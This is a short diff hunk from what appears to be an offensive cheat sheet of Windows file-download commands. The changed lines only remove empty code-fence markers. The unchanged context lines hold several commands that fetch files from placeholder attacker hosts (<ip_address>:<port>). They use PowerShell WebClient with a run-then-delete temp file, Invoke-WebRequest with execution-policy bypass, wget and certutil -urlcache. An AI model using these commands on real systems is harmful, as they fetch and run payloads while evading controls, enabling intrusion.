@@ -247,10 +247,6 @@ IO.Path]::GetTempFileName(); $tempfile += '.<ext>'; $wc.DownloadFile('[URL]', $t
 $tempfile ; Remove-Item -Force $tempfile
 powershell.exe -exec bypass -C Invoke-WebRequest "http:/<ip_address>:<port>/file.ext" -OutFile "file.ext"
 powershell.exe -C wget "http[:]//<ip_address>:<port>/file.ext" -OutFile "file.ext"
-
-```
-
-```
 cmd.exe /c certutil -urlcache -split -f hxxp[:]//<ip_address>:<port>/file.ext $path\to\outfile\outfile.ext
 ```
 
